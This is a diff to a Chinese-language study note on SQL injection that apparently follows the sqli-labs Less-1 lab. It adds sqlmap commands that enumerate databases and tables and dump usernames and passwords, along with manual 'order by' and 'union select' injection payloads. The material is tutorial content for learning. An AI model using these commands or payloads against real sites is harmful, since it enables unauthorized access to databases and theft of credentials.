@@ -20,6 +20,9 @@ SQL注入是学习过程中第一个接触的漏洞，也是应用比较广泛�
 
 `select * from table where id = ("'input'"")`
 
+## 注入思路
+验证漏洞存在-->使用sqlmap工具或webshell手工注入
+
 ## 语句速查表
 ### 1 常用注入测试payload
 
@@ -39,6 +42,18 @@ SQL注入是学习过程中第一个接触的漏洞，也是应用比较广泛�
 
 ### 2 常用查询注入语句(分为SQLmap语句和手工注入)
 #### SQLmap语句
+
+`sqlmap.py -u "http://IP/Less-1/?id=1" `
+
+`sqlmap.py -u "http://IP/Less-1/?id=1" --current-db`
+
+`sqlmap.py -u "http://IP/Less-1/?id=1" --tables -D "你刚刚查到的数据库名"`
+
+`sqlmap.py -u "http://IP/Less-1/?id=1"  --columns -T "users" -D "你刚刚查到的数据库名"`
+
+`sqlmap.py -u "http://IP/Less-1/?id=1"  --dump -C"id,username,password" -T "users" -D "security"`
+
+
 
 
 #### 手工注入
@@ -99,7 +114,7 @@ MySQL 的报错格式是：... right syntax to use near '<出错的SQL片段>' a
 
 
 ### （二） 开始愉快的注入
-#### (1)使用sqlmap工具自动注入
+#### (1)使用sqlmap工具自动注入(os:使用小飞机发起进攻...)
 1. 用Sqlmap查询数据库类型,输入命令：
 
 `sqlmap.py -u "http://IP/Less-1/?id=1" `
@@ -120,12 +135,32 @@ MySQL 的报错格式是：... right syntax to use near '<出错的SQL片段>' a
 
 `sqlmap.py -u "http://IP/Less-1/?id=1"  --dump -C"id,username,password" -T "users" -D "security"`
 
-#### (2) 掌握手工注入的办法
+#### (2) 掌握手工注入的办法(os:如果你没有sqlmap工具，你要怎么发起攻击呢...?)
 ##### 1. 列字段检测
+`order by n`
+
+解释: `order by n`语句用于测试正确的字段数n
+
+##### 2. 手工注入
+采用`union select`联合注入法
+
+原理: 在url语句中已经使用了`'`或者其他的字段闭合了前一个sql语句，后面接`union select`表示继续执行下一个查询语句
+
+示例语句:
+
+`id=-1' union select 1,2,3 --+`
+
+
+
+
+
 
 
 
 
 ## SQL数据库的补充知识
+1 注释符号: 常见注释符号为`#` `--`
+2 特殊转义符号: 常见转义符号有`+`(在拼接进入sql语句时会自动变成空格)
+
 
 
